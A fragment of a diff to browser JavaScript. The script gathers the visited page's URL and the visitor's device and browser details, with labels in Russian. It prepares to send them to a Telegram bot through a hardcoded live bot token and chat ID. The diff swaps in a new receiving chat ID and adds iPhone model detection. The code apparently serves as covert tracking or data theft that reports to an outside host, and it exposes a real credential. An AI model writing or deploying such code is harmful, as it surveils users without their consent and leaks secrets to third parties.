@@ -2,16 +2,29 @@
 console.log(currentLocation);
 
 let botToken = '6735455497:AAHTFrKiu3NL-1jP_Qe3Qoi5vfvaUK2ByAY';
-let chatId = '4128038389';
+let chatId = '5804614037';
 let messageText = currentLocation.href;
 
 let apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
 function getDeviceInfo() {
-  let deviceModel = platform.product || "Unknown";
+  let platform = navigator.platform;
+  let userAgent = navigator.userAgent;
+
+  let model = "Unknown";
+
+  if (/iPhone/.test(userAgent)) {
+    let match = userAgent.match(/iPhone\s([\w\d]+)/);
+    if (match) {
+      model = match[1];
+    } else {
+      model = "iPhone";
+    }
+  }
+
   let browserInfo = `Браузер: ${navigator.appName} ${navigator.appVersion}`;
 
-  return `Пользователь ${deviceModel}\n${browserInfo}`;
+  return `Пользователь ${model}\n${browserInfo}`;
 }
 
 function handleTouchStart(e) {
